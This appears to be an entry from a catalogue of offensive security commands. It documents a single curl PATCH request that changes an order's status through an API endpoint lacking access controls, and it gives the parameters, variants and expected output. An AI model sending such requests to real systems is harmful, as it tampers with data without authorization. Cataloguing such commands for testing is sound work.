---
id: f6g7h8i9-j0k1-2345-fghi-678901234567
data: >-
  curl -X PATCH "https://target-app.com/api/v1/orders/12345" -H "Content-Type:
  application/json" -d '{"status": "cancelled"}' -v
tags:
  - api
  - modification
  - broken-access-control
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:30:07.289Z'
verified: false
validated: true
submitted: true
---
# curl-patch-order-status

## Command

```bash
curl -X PATCH "https://target-app.com/api/v1/orders/12345" -H "Content-Type: application/json" -d '{"status": "cancelled"}' -v
```

## Description

This command updates an order's status via an unprotected API endpoint using curl, allowing unauthorized modifications due to missing access controls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PATCH` | Specifies HTTP PATCH method | Yes |
| URL | Target endpoint with order ID | Yes |
| `-H "Content-Type: application/json"` | Sets JSON header | Yes |
| `-d '{...}'` | JSON payload with status | Yes |
| `-v` | Verbose output | No |

## Examples

### Basic Usage

```bash
curl -X PATCH "https://target-app.com/api/v1/orders/12345" -H "Content-Type: application/json" -d '{"status": "cancelled"}'
```

### Advanced Usage

```bash
curl -X PATCH "https://target-app.com/api/v1/orders/12345" -H "Content-Type: application/json" -d '{"status": "shipped"}' | jq '.'
```

## Expected Output

{"success":true,"updated_status":"cancelled"} or similar confirmation. 200 OK status code.

## Related

- [[Related Procedure: Modify-Order-Status-via-Unprotected-Endpoint]]
